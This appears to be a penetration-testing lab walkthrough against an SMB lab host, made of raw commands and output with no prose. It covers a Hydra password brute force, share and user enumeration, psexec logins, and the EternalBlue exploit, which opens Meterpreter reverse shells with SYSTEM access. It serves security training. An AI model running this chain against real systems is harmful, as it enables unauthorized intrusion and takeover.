# Targeting SMB

```sh
root@attackdefense:~# nmap -sV -sC -p 445 10.5.25.248
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-14 19:12 IST
Nmap scan report for demo.ine.local (10.5.25.248)
Host is up (0.0019s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h39m58s, deviation: 4h37m07s, median: -1s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: VAGRANT-2008R2, NetBIOS user: <unknown>, NetBIOS MAC: 02:c2:62:0d:82:af (unknown)
| smb2-time: 
|   date: 2024-01-14T13:42:46
|_  start_date: 2024-01-14T13:16:46
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: vagrant-2008R2
|   NetBIOS computer name: VAGRANT-2008R2\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-01-14T05:42:46-08:00
```

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt 10.5.25.248 smb
Hydra v9.2 (c) 2021 by van Hauser/THC &#x26; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-14 19:15:45
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 168 login tries (l:1/p:168), ~168 tries per task
[DATA] attacking smb://10.5.25.248:445/
<strong>[445][smb] host: 10.5.25.248   login: administrator   password: vagrant
</strong>1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-14 19:15:48
root@attackdefense:~# hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.5.25.248 smb
Hydra v9.2 (c) 2021 by van Hauser/THC &#x26; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-14 19:19:08
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 168 login tries (l:1/p:168), ~168 tries per task
[DATA] attacking smb://10.5.25.248:445/
<strong>[445][smb] host: 10.5.25.248   login: vagrant   password: vagrant
</strong>1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-14 19:19:10
</code></pre>

```sh
root@attackdefense:~# smbclient -L 10.5.25.248 -U vagrant
Enter WORKGROUP\vagrant's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.5.25.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available




root@attackdefense:~# smbmap -u vagrant -p vagrant -H 10.5.25.248
[+] IP: 10.5.25.248:445 Name: demo.ine.local                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    NO ACCESS       Remote IPC

```

```sh
root@attackdefense:~# enum4linux -u vagrant -p vagrant -U 10.5.25.248
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan 14 19:22:38 2024

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.5.25.248
RID Range ........ 500-550,1000-1050
Username ......... 'vagrant'
Password ......... 'vagrant'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 10.5.25.248    |
 =================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ==================================== 
|    Session Check on 10.5.25.248    |
 ==================================== 
[+] Server 10.5.25.248 allows sessions using username 'vagrant', password 'vagrant'

 ========================================== 
|    Getting domain SID for 10.5.25.248    |
 ========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ============================ 
|    Users on 10.5.25.248    |
 ============================ 
index: 0x1 RID: 0x1f4 acb: 0x00000010 Account: Administrator    Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x2 RID: 0x3f3 acb: 0x00000010 Account: anakin_skywalker Name: (null)    Desc: (null)
index: 0x3 RID: 0x3ef acb: 0x00000010 Account: artoo_detoo      Name: (null)    Desc: (null)
index: 0x4 RID: 0x3f1 acb: 0x00000010 Account: ben_kenobi       Name: (null)    Desc: (null)
index: 0x5 RID: 0x3f6 acb: 0x00000010 Account: boba_fett        Name: (null)    Desc: (null)
index: 0x6 RID: 0x3f0 acb: 0x00000010 Account: c_three_pio      Name: (null)    Desc: (null)
index: 0x7 RID: 0x3f9 acb: 0x00000010 Account: chewbacca        Name: (null)    Desc: (null)
index: 0x8 RID: 0x3f2 acb: 0x00000010 Account: darth_vader      Name: (null)    Desc: (null)
index: 0x9 RID: 0x3f8 acb: 0x00000010 Account: greedo   Name: (null)    Desc: (null)
index: 0xa RID: 0x1f5 acb: 0x00000215 Account: Guest    Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xb RID: 0x3ee acb: 0x00000010 Account: han_solo Name: (null)    Desc: (null)
index: 0xc RID: 0x3f7 acb: 0x00000010 Account: jabba_hutt       Name: (null)    Desc: (null)
index: 0xd RID: 0x3f4 acb: 0x00000010 Account: jarjar_binks     Name: (null)    Desc: (null)
index: 0xe RID: 0x3fa acb: 0x00000010 Account: kylo_ren Name: (null)    Desc: (null)
index: 0xf RID: 0x3f5 acb: 0x00000010 Account: lando_calrissian Name: (null)    Desc: (null)
index: 0x10 RID: 0x3ec acb: 0x00000010 Account: leia_organa     Name: (null)    Desc: (null)
index: 0x11 RID: 0x3ed acb: 0x00000010 Account: luke_skywalker  Name: (null)    Desc: (null)
index: 0x12 RID: 0x3e9 acb: 0x00000211 Account: sshd    Name: sshd privsep      Desc: (null)
index: 0x13 RID: 0x3ea acb: 0x00000210 Account: sshd_server     Name: sshd server account       Desc: (null)
index: 0x14 RID: 0x3e8 acb: 0x00000210 Account: vagrant Name: vagrant   Desc: Vagrant User

user:[Administrator] rid:[0x1f4]
user:[anakin_skywalker] rid:[0x3f3]
user:[artoo_detoo] rid:[0x3ef]
user:[ben_kenobi] rid:[0x3f1]
user:[boba_fett] rid:[0x3f6]
user:[chewbacca] rid:[0x3f9]
user:[c_three_pio] rid:[0x3f0]
user:[darth_vader] rid:[0x3f2]
user:[greedo] rid:[0x3f8]
user:[Guest] rid:[0x1f5]
user:[han_solo] rid:[0x3ee]
user:[jabba_hutt] rid:[0x3f7]
user:[jarjar_binks] rid:[0x3f4]
user:[kylo_ren] rid:[0x3fa]
user:[lando_calrissian] rid:[0x3f5]
user:[leia_organa] rid:[0x3ec]
user:[luke_skywalker] rid:[0x3ed]
user:[sshd] rid:[0x3e9]
user:[sshd_server] rid:[0x3ea]
user:[vagrant] rid:[0x3e8]
enum4linux complete on Sun Jan 14 19:22:38 2024
```

```sh
msf6 > search smb_enumusers

Matching Modules
================

   #  Name                                        Disclosure Date  Rank    Check  Description
   -  ----                                        ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_enumusers_domain                   normal  No     SMB Domain User Enumeration
   1  auxiliary/scanner/smb/smb_enumusers                          normal  No     SMB User Enumeration (SAM EnumUsers)


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/smb/smb_enumusers

msf6 > use 1
msf6 auxiliary(scanner/smb/smb_enumusers) > set RHOSTS 10.5.25.248
RHOSTS => 10.5.25.248
msf6 auxiliary(scanner/smb/smb_enumusers) > set SMBUSER vagrant
SMBUSER => vagrant
msf6 auxiliary(scanner/smb/smb_enumusers) > set SMBPASS vagrant
SMBPASS => vagrant
msf6 auxiliary(scanner/smb/smb_enumusers) > run

[+] 10.5.25.248:445       - VAGRANT-2008R2 [ Administrator, anakin_skywalker, artoo_detoo, ben_kenobi, boba_fett, chewbacca, c_three_pio, darth_vader, greedo, Guest, han_solo, jabba_hutt, jarjar_binks, kylo_ren, lando_calrissian, leia_organa, luke_skywalker, sshd, sshd_server, vagrant ] ( LockoutTries=0 PasswordMin=0 )
[*] 10.5.25.248:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```sh
root@attackdefense:~# locate psexec.py
/usr/share/doc/python3-impacket/examples/psexec.py
/usr/share/koadic/modules/implant/pivot/exec_psexec.py
/usr/share/powershell-empire/empire/server/modules/powershell/lateral_movement/invoke_psexec.py
/usr/share/set/src/fasttrack/psexec.py
root@attackdefense:~# cd Desktop/
root@attackdefense:~/Desktop# cp /usr/share/doc/python3-impacket/examples/psexec.py .


root@attackdefense:~/Desktop# chmod +x psexec.py 
root@attackdefense:~/Desktop# python3 psexec.py administrator@10.5.25.248
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.5.25.248.....
[*] Found writable share ADMIN$
[*] Uploading file ZqUnCKXj.exe
[*] Opening SVCManager on 10.5.25.248.....
[*] Creating service hAPs on 10.5.25.248.....
[*] Starting service hAPs.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

```sh
msf6 > search psexec

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
   1   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2   auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3   auxiliary/scanner/smb/psexec_loggedin_users                   normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
   4   exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   5   auxiliary/admin/smb/psexec_ntdsgrab                           normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   6   exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token
   7   encoder/x86/service                                           manual     No     Register Service
   8   auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec
   9   exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution
   10  exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution


Interact with a module by name or index. For example info 10, use 10 or use exploit/windows/local/wmi

msf6 > use 4
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.5.25.248
RHOSTS => 10.5.25.248
msf6 exploit(windows/smb/psexec) > set SMBUSER administrator
SMBUSER => administrator
msf6 exploit(windows/smb/psexec) > set SMBPASS vagrant
SMBPASS => vagrant
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.12.2:4444 
[*] 10.5.25.248:445 - Connecting to the server...
[*] 10.5.25.248:445 - Authenticating to 10.5.25.248:445 as user 'administrator'...
[*] 10.5.25.248:445 - Selecting PowerShell target
[*] 10.5.25.248:445 - Executing the payload...
[+] 10.5.25.248:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (200262 bytes) to 10.5.25.248
[*] Meterpreter session 1 opened (10.10.12.2:4444 -> 10.5.25.248:49536 ) at 2024-01-14 19:31:50 +0530

meterpreter > sysinfo
Computer        : VAGRANT-2008R2
OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

```sh
msf6 exploit(windows/smb/psexec) > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 exploit(windows/smb/psexec) > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.5.25.248
RHOSTS => 10.5.25.248
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.12.2:4444 
[*] 10.5.25.248:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.5.25.248:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
[*] 10.5.25.248:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.5.25.248:445 - The target is vulnerable.
[*] 10.5.25.248:445 - Connecting to target for exploitation.
[+] 10.5.25.248:445 - Connection established for exploitation.
[+] 10.5.25.248:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.5.25.248:445 - CORE raw buffer dump (51 bytes)
[*] 10.5.25.248:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 10.5.25.248:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
[*] 10.5.25.248:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[*] 10.5.25.248:445 - 0x00000030  6b 20 31                                         k 1             
[+] 10.5.25.248:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.5.25.248:445 - Trying exploit with 12 Groom Allocations.
[*] 10.5.25.248:445 - Sending all but last fragment of exploit packet
[*] 10.5.25.248:445 - Starting non-paged pool grooming
[+] 10.5.25.248:445 - Sending SMBv2 buffers
[+] 10.5.25.248:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.5.25.248:445 - Sending final SMBv2 buffers.
[*] 10.5.25.248:445 - Sending last fragment of exploit packet!
[*] 10.5.25.248:445 - Receiving response from exploit packet
[+] 10.5.25.248:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.5.25.248:445 - Sending egg to corrupted connection.
[*] 10.5.25.248:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.5.25.248
[+] 10.5.25.248:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.5.25.248:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.5.25.248:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 2 opened (10.10.12.2:4444 -> 10.5.25.248:49544 ) at 2024-01-14 19:33:40 +0530

meterpreter > sysinfo
Computer        : VAGRANT-2008R2
OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
